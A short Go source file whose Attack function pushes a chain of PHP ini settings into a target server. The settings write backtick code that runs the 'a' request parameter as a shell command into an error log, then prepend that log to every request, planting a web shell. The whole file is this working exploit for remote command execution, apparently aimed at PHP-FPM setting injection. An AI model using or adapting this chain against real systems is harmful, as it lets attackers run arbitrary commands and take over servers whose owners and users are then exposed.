package main

func Attack(req *Requester, params *AttackParams) error {
	chain := [...]string{
		"short_open_tag=1",
		"html_errors=0",
		"include_path=/tmp",
		"auto_prepend_file=a",
		"error_reporting=9999999",
		"error_log=/tmp/a",
		"extension_dir=\"<?`\"",
		"extension=\"$_GET[a]`?>\"",
	}
	for _, payload := range chain {
		SetSetting(req, params, payload)
	}
	return nil
}
